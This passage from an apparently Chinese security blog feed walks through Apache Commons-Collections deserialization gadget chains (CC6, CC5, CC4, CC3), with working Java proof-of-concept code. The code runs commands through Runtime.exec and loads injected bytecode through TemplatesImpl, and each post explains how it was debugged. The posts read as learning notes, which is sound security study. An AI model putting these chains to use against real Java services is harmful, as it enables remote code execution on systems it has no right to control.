class="string">&quot;sss&quot;</span>);</span><br><span class="line">        decorate.remove(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//serialize(hashMap);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>由于在java  8u71，这个利⽤链不能再利⽤了，主要原因 是sun.reflect.annotation.AnnotationInvocationHandler#readObject 的逻辑变化了。</p><p>ysoserial作者找到了另一条能够触发lazymap的方法，就是TiedMapEntry这个类中的getValue方法中调用了get方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714631173688-6b2f4fa3-9729-4e57-a6d4-ffcde6469ec7.png" alt=""></p><p>在其同类中的hashcode方法调用了get方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714631197142-e2200442-a755-48e6-bbd1-283141a6b22b.png" alt=""></p><p>所以我们想要进行rce就需要找到一个可以触发hashcode的方法，在URLDNS链中我们知道hashmap的readobject中调用了hash方法，而其hash方法中又调用了hashcode方法，所以调用链就出来了，我们可以构造一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] fake_transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fake_transformers);</span><br><span class="line"><span class="type">Map</span> <span class="variable">decorate</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chainedTransformer);</span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(decorate, <span class="string">&quot;key&quot;</span>);</span><br><span class="line">HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">hashMap.put(key,<span class="string">&quot;sss&quot;</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">f.set(chainedTransformer, transformers);</span><br></pre></td></tr></table></figure><p>这里由于hasmap在put的时候也会调用hash方法所以我们先用一个假的invokertransformer进行put然后在反射修改成真的就不会在put的时候触发了，但是我们这样反序列化运行后发现也没有触发，这是什么原因，我们跟进来看看</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714631432833-aa4fdbc8-ce47-40e3-9f90-21c1541abfdd.png" alt="">我们发现在lazymap中并没有进入if条件，这说明key被传入了，但是我们并没有给lazymao传入值，这里通过调试发现我们在hashmap进行put的时候进入lazymap的if条件之后如果没有key值他是会在进行put进去的所以我们只需要在put之后在进行删除即可poc如开头。</p><p>参考：<a href="https://blog.csdn.net/weixin_49125123/article/details/135232651">https://blog.csdn.net/weixin_49125123/article/details/135232651</a> <a href="https://www.yuque.com/attachments/yuque/0/2024/pdf/25729212/1714631644198-f098a5bc-21e1-44bd-ad0f-51db9c50d07f.pdf">Java安全漫谈 - 12.反序列化篇(6).pdf</a></p><h3 id="cc6调用链">cc6调用链</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714668463375-9a53c70d-4ae7-414f-a145-96b13370c7c6.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在ysoserial中，CommonsCollections6可以说是commons-collections这个库中相对⽐较通⽤的利⽤ 链，为了解决⾼版本Java的利⽤问题，我们先来看看这个利⽤链。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;t</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="CC链" scheme="https://oceanzbz.github.io/tags/CC%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Commons-Collections5反序列化</title>
    <link href="https://oceanzbz.github.io/post/fb89853c.html"/>
    <id>https://oceanzbz.github.io/post/fb89853c.html</id>
    <published>2024-12-30T06:36:25.000Z</published>
    <updated>2025-03-05T07:24:36.788Z</updated>
    
    <content type="html"><![CDATA[<p>cc5的调用链和cc1 lazyMap调用链很相似，只不过cc5调用链最后触发get方法那里变成了TiedMapEntry的toString方法，然后利用BadAttributeValueExpException的readObject触发。</p><p>看一下poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;11&quot;</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class="line">        <span class="comment">//serialize(badAttributeValueExpException);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>通过poc我们发现直到lazyMap都是和cc1一样的调用，后面从Proxy改成了TiedMapEntry类</p><p>我们知道触发该条链是需要触发到LazyMap的get方法我们调试一下</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743599823-bddea8e9-0437-4c54-af01-80ba9066a9eb.png" alt=""></p><p>我们找到了TiedMapEntry类里面的toString方法中调用了 getValue方法。这个有点熟悉在cc6中出现过跟到getValue中</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743660503-cd5c9bc1-8c39-46cf-b740-28dbd39bbed1.png" alt=""></p><p>发现调用了 get方法而我们在cc6中已将知道TiedMapEntry类的构造方法是可以直接对map这个属性进行赋值的</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743712373-34322b83-7a98-4342-b42d-288737acc8f4.png" alt=""></p><p>所以这里只需要找到可以触发该类toString的方法就可以</p><p>继续调试我们发现了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743765500-03b8b2ed-d1f5-4333-a121-ea4abb10fa02.png" alt="">在BadAttributeValueExpException这个类的readObject中发现了调用了toString方法是由valObj触发的而valObj则是获得val属性的值，然后看看其构造方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714743831365-8c298754-31a8-4aa8-8fa4-cb28ef460830.png" alt=""></p><p>发现val是可控的，但是发现在构造方法里也调用了toString方法，所以在构造的时候不能传入TiedMapEntry对象，因为这回导致在序列化前就会rce所以我们需要在实例化完之后反射修改其属性值就可以了。</p><h3 id="cc5调用链">cc5调用链</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714744407880-2899e688-e3e0-4ee2-bf22-275798698aa0.png" alt=""></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;cc5的调用链和cc1 lazyMap调用链很相似，只不过cc5调用链最后触发get方法那里变成了TiedMapEntry的toString方法，然后利用BadAttributeValueExpException的readObject触发。&lt;/p&gt;
&lt;p&gt;看一下poc&lt;/p</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="CC链" scheme="https://oceanzbz.github.io/tags/CC%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Commons-Collections4反序列化</title>
    <link href="https://oceanzbz.github.io/post/261f5cb9.html"/>
    <id>https://oceanzbz.github.io/post/261f5cb9.html</id>
    <published>2024-12-30T06:36:15.000Z</published>
    <updated>2025-03-05T07:24:36.787Z</updated>
    
    <content type="html"><![CDATA[<p>其实如果搞懂了cc2 和 cc3 两条链，cc4链就没啥难度了，它就是这俩的结合具体分析看cc2 与cc3</p><h3 id="cc4调用链">cc4调用链</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue.readObject()</span><br><span class="line">PriorityQueue.heapify()</span><br><span class="line">PriorityQueue.siftDown()</span><br><span class="line">PriorityQueue.siftDownUsingComparator()</span><br><span class="line">TransformingComparator.compare()</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">ConstantTransformer.transform()</span><br><span class="line">InstantiateTransformer.transform()</span><br><span class="line">TrAXFilter.TrAXFilter()</span><br><span class="line">TemplatesImpl.newTransformer()</span><br><span class="line">TemplatesImpl.getTransletInstance()</span><br></pre></td></tr></table></figure><p>贴出poc</p><pre><code class="language-java">//后半段用的是cc3        byte[] shellcode = Files.readAllBytes(Paths.get(&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;));        TemplatesImpl templates = new TemplatesImpl();        // 获取 class 对象        Class clazz = templates.getClass();        // 下面是需要修改的一些变量        Field nameField = clazz.getDeclaredField(&quot;_name&quot;);        nameField.setAccessible(true);        nameField.set(templates, &quot;_name&quot;);        Field classField = clazz.getDeclaredField(&quot;_tfactory&quot;);        classField.setAccessible(true);        classField.set(templates, new TransformerFactoryImpl());        Field bytecodesField = clazz.getDeclaredField(&quot;_bytecodes&quot;);        bytecodesField.setAccessible(true);        bytecodesField.set(templates, new byte[][]&#123;shellcode&#125;);        // 触发方法        Transformer[] transformers = new Transformer[] &#123;                new ConstantTransformer(TrAXFilter.class),                new InstantiateTransformer(new Class [] &#123;Templates.class&#125;,new Object [] &#123;templates&#125;)        &#125;;        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);        //前半段是cc2        TransformingComparator comparator = new TransformingComparator(new ConstantTransformer(1));        PriorityQueue queue = new PriorityQueue(comparator);//创建实例。注意下面的顺序改变了。        queue.add(templates);        queue.add(2);//传入两个参数        Field field = Class.forName(&quot;org.apache.commons.collections4.comparators.TransformingComparator&quot;).getDeclaredField(&quot;transformer&quot;);//反射获取成员变量的field        field.setAccessible(true);//获取访问权限        field.set(comparator,chainedTransformer);//设置参数        //serialize(queue);        unserialize(&quot;ser.bin&quot;);</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;其实如果搞懂了cc2 和 cc3 两条链，cc4链就没啥难度了，它就是这俩的结合具体分析看cc2 与cc3&lt;/p&gt;
&lt;h3 id=&quot;cc4调用链&quot;&gt;cc4调用链&lt;/h3&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class</summary>
      
    
    
    
    <category term="Java安全" scheme="https://oceanzbz.github.io/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="反序列化" scheme="https://oceanzbz.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="CC链" scheme="https://oceanzbz.github.io/tags/CC%E9%93%BE/"/>
    
  </entry>
  
  <entry>
    <title>Commons-Collections3反序列化</title>
    <link href="https://oceanzbz.github.io/post/5b6c5ae1.html"/>
    <id>https://oceanzbz.github.io/post/5b6c5ae1.html</id>
    <published>2024-12-30T06:35:51.000Z</published>
    <updated>2025-03-05T07:24:36.787Z</updated>
    
    <content type="html"><![CDATA[<p>java cc3链<br>cc3用的是动态加载字节码的形式进行的rce可以参考自己记得<a href="">动态加载字节码</a>的笔记来了解。</p><p>该链主要是利用了TemplatesImpl这个类进行字节码加载。通过笔记我们了解到java加载.class的核心代码就是defineclass方法，而通过调试发现TemplatesImpl这个类中定义了一个内部类重写了defineclass方法并且这里没有显式地声明其定义域。Java中默认情况下，如果一个 方法没有显式声明作用域，其作用域为default。所以也就是说这里的 defineClass 由其父类的 protected类型变成了一个default类型的方法，可以被类外部调用。<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663398722-55450f8c-336f-4160-9cb6-fb68b2367e15.png" alt=""></p><p>但是我们需要找到一个该类一个public类型来进行调用该方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663560670-d044b685-2961-437d-9c2a-a31d628255f9.png" alt="">我们反向跟踪在defineTransletClasses中调用了该方法，需要_bytecodes不为空，其实这个属性就是我们要传入的字节码但是还不能调用需要继续跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663667380-3fba4569-64f0-44c6-8109-40b9ad24962d.png" alt=""></p><p>找到了getTransletInstance方法并且其属性_name不能为空 _class需要为空才可以调用，但是还是不能在外部调用需要继续跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663736056-8819d01c-e84c-4813-b5a3-4f98c449fd25.png" alt=""></p><p>最终找到了newTransformer方法是public类型的，所以我们可以通过实例化TemplatesImpl对象调用newTransformer方法来触发defineclass加载字节码。</p><p>接下来我们需要看一下TemplatesImpl构造方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714663912873-86f895fb-445f-4457-b20d-6b315e042693.png" alt=""></p><p>发现并没用进行任何赋值所以我们需要自己手动进行反射赋值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 class 对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 下面是需要修改的一些变量</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 触发方法</span></span><br><span class="line">        templates.newTransformer();</span><br></pre></td></tr></table></figure><p>运行发现空指针错误，通过调试发现</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664277730-268e14ac-7775-4c4f-b300-2ac2366302ae.png" alt=""></p><p>_tfactory为空所以我们需要给其传入值，</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664331886-af671cab-f9c8-446d-a443-5829c7d7f385.png" alt=""></p><p>通过查看发现其是transient类型是不可序列化的，所以我们通过产看readObject中看看是给其赋值的什么就给他赋值什么就可以</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664419837-1a271fc1-9a92-4754-a71d-4bea2f9f6eee.png" alt=""></p><p>所以重新构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">bbyte[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取 class 对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 下面是需要修改的一些变量</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 触发方法</span></span><br><span class="line">        templates.newTransformer();</span><br></pre></td></tr></table></figure><p>但是运行之后发现还是报错</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664557971-bc6614a1-c6ac-46ba-93da-c9270ba0cc09.png" alt=""></p><p>原因是在加载字节码之后有一个方法查看字节码的父类是否是<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714664601418-b93e8e9d-23be-46c0-9744-cc79bf454422.png" alt=""></p><p>所以我们需要让我们的恶意类继承该类之后就可以运行了。</p><p>然后我们和之前的cc1链前面结合一下就可以成为一个链了</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] shellcode = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\javaserilization\\cclian\\target\\classes\\org\\example\\test.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="comment">// 获取 class 对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="comment">// 下面是需要修改的一些变量</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">classField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        classField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        classField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodesField.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;shellcode&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 触发方法</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="comment">//chainedTransformer.transform(1);</span></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;className&quot;</span>,<span class="string">&quot;aass&quot;</span>); <span class="comment">//给map一个键值对，方便遍历</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造transformedmap是调用tranform()的前置条件</span></span><br><span class="line">        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(</span><br><span class="line">                map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取sun.reflect.annotation.AnnotationInvocationHandler类的Class对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> constructor.newInstance(FaultAction.class, transformedMap);</span><br><span class="line">        <span class="comment">//serialize(o);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p>但是我们通过查看ysoserial作者发现其构造的链跟我们不一样，他没有用这个InvokerTransformer去触发，原因就是因为可能有些waf会对InvokerTransformer做了黑名单限制导致不能够使用了。</p><p>所以ysoserial作者发现了com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter 。 这个类的构造⽅法中调⽤了 (TransformerImpl) templates.newTransformer() ，免去了我们使⽤ InvokerTransformer⼿⼯调⽤ newTransformer() ⽅法这⼀步：</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1714666476954-c09853ee-7994-4d00-978e-9e7cc10e2c93.png" alt=""></p><p>但是呢由于该类是不可以被序列化的，所以我们只能通过对其反射获取class对象对其进行赋值，这里作者ysoserial找到一个InstantiateTransformer类他实现了transformer Serializable接口，在它的transform()方法中，判断了input参数是否为Class，若是Class，则通过反射实例化一个对象并返回；</p><p><img 